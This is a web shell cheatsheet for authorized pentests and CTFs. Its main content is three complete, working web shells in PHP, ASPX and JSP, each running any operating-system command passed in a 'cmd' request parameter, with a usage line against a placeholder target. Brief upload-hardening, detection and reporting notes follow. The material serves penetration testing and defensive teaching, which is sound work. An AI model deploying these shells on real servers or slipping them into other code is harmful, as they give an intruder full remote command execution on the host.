# Web Shell Cheatsheet

> For use in authorized labs, CTFs, and pentests only. Uploading a web shell to a system you don't own or don't have written authorization to test is illegal.

A web shell is a small script used, in an authorized engagement, to validate that an unrestricted file upload or remote code execution vulnerability is actually exploitable, so it can be reported and fixed.

## Minimal PHP web shell

```php
<?php system($_GET['cmd']); ?>
```

Usage in an authorized test: `http://TARGET/uploaded.php?cmd=id`

## Minimal ASPX web shell

```aspx
<%@ Page Language="C#" %>
<%
System.Diagnostics.Process p = new System.Diagnostics.Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/c " + Request.QueryString["cmd"];
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.Start();
Response.Write(p.StandardOutput.ReadToEnd());
%>
```

## Minimal JSP web shell

```jsp
<%@ page import="java.io.*" %>
<% String cmd = request.getParameter("cmd");
   Process p = Runtime.getRuntime().exec(cmd);
   BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
   String line; while((line = br.readLine()) != null) { out.println(line); }
%>
```

## Detection / defense notes

- File upload validation should check content, not just extension (magic bytes, MIME type, image re-encoding).
- Store uploads outside the webroot, or disable script execution in the upload directory.
- Web Application Firewalls and file-integrity monitoring (e.g. Tripwire, OSSEC) can catch dropped shells.
- Log and alert on new `.php`/`.aspx`/`.jsp` files appearing in web-accessible directories.

## Reporting

When used during an authorized assessment, document: upload vector, resulting shell path, commands run to demonstrate impact, and a remediation recommendation — then remove the shell after the engagement per your rules of engagement.
